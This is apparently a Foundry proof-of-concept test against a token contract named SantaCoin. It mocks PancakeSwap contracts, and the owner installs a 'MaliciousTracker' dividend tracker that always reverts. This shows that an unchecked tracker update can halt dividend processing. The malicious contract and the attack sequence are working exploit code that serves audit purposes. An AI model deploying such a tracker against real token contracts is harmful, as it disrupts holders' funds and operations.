// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SantaCoin.sol";

// Defined WETH Token mock for token operations
contract WETH {
    function name() external pure returns (string memory) { return "WETH"; }
    function symbol() external pure returns (string memory) { return "WETH"; }
    function decimals() external pure returns (uint8) { return 18; }
}

contract MockUniswapV2Factory {
    function createPair(
        address tokenA, 
        address tokenB
    ) external pure returns (address pair) {
        // Returns deterministic dummy pair address
        return address(uint160(uint256(keccak256(abi.encode(tokenA, tokenB)))));
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETHAddress;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETHAddress = _weth;
    }

    function WETH() external view returns (address) {
        return WETHAddress;
    }
}

contract MaliciousTracker {
    address public owner;

    constructor(address newOwner) {
        owner = newOwner;
    }

    function excludeFromDividends(address) external {
        // Do nothing
    }

    function process(uint256) external pure returns (uint256, uint256, uint256) {
        revert("MaliciousTracker: Always reverts");
    }
}

contract SantaCoinTest is Test {
    SantaCoin public santa;
    MaliciousTracker public maliciousTracker;
    
    address constant NEW_OWNER = 0xc70327c3C21F6B3922f3a843B9fF77677140bfee;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant WETH_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address alice = makeAddr("alice");

    function setUp() public {
        // Set chain ID to 56 (BSC)
        vm.chainId(56);
        
        // Deploy mock WETH token at fixed address
        vm.etch(WETH_ADDRESS, address(new WETH()).code);
        
        // Deploy and configure mock contracts
        MockUniswapV2Factory mockFactory = new MockUniswapV2Factory();
        MockUniswapV2Router mockRouter = new MockUniswapV2Router(address(mockFactory), WETH_ADDRESS);
        
        // Replace PancakeSwap contracts with mocks
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
        vm.etch(PANCAKE_FACTORY, address(mockFactory).code);
        
        // Impersonate owner to deploy token
        vm.startPrank(NEW_OWNER);
        santa = new SantaCoin();
        santa.transferOwnership(alice);
        vm.stopPrank();

        // Deploy malicious dividend tracker
        maliciousTracker = new MaliciousTracker(address(santa));

        // Alice sets malicious dividend tracker
        vm.startPrank(alice);
        santa.updateDividendTracker(address(maliciousTracker));
        vm.stopPrank();
    }

    function test_UntrustedSource_Vulnerability() public {
        console.log("--- BEFORE-Trigger: Dividend Tracker State Verification ---");
        address initialTrackerAddress = address(santa.dividendTracker());
        console.log("Current dividend tracker:", initialTrackerAddress);
        console.log("Is malicious tracker set?", initialTrackerAddress == address(maliciousTracker));
        require(initialTrackerAddress == address(maliciousTracker), "Malicious tracker not set");
        
        console.log("");
        console.log("--- ATTACK TRIGGERED: Malicious Dividend Tracker Execution ---");
        console.log("Expecting revert: 'MaliciousTracker: Always reverts'");
        
        vm.startPrank(alice);
        vm.expectRevert("MaliciousTracker: Always reverts");
        santa.processDividendTracker(100000);
        vm.stopPrank();
        
        console.log("");
        console.log("--- AFTER-Trigger: Dividend Tracker Persistence Check ---");
        address finalTrackerAddress = address(santa.dividendTracker());
        console.log("Post-trigger dividend tracker:", finalTrackerAddress);
        bool unchanged = (initialTrackerAddress == finalTrackerAddress);
        console.log("Tracker unchanged after failed execution?", unchanged);
        
        // Final vulnerability verdict
        if (unchanged) {
            console.log("Vulnerability Exists: Malicious tracker persists after failed execution");
        } else {
            console.log("Vulnerability Not Detected: Tracker changed after attack");
        }

        // Final assertion as per requirements
        assertTrue(unchanged, "Vulnerability not exists");
        console.log("Vulnerability confirmed: Non-secured DividendTracker update allows disruption of token operations");
    }
}